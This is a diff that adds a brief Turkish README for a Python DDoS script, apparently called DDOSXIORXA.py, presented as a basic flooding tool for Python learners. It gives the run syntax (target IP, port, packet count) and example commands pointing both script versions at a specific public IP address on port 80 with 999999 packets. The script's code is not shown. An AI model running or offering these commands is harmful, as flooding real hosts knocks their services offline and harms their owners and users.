@@ -1,0 +1,11 @@
+Selamun Aleyküm Bu ddos Python İle Yapılmış Temel Düzey Bir DDOS, Pythonla İlgilenip Kendini Geliştirmek İsteyen Hocalarım İçin...
+
+Çalışma : 
+
+python DDOSXIORXA.py (ip) (port) (pack)
+
+örnek :
+
+python DDOSXIORXA.py 50.28.32.214 80 999999
+
+python DDOSXIORXAV2.py 50.28.32.214 80 999999
